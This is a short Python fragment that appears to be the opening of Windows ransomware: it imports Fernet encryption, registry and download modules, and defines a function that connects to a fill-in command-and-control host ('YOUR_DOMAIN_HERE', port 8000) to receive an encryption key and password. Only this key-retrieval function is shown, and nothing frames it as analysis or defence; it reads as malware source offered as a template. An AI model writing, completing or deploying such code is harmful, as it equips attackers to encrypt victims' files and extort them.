#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, time, winreg

def keyrcv():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("YOUR_DOMAIN_HERE", 8000))
        enter = "[!] Transfert the key and the password :\n "
        exit = "\n[!] Transfert [OK]"
        sock.send(enter.encode())
        print(sock.recv(2048).decode())
        key = sock.recv(2048)
        sock.send(exit.encode())
        sock.close()
    except:
        return False
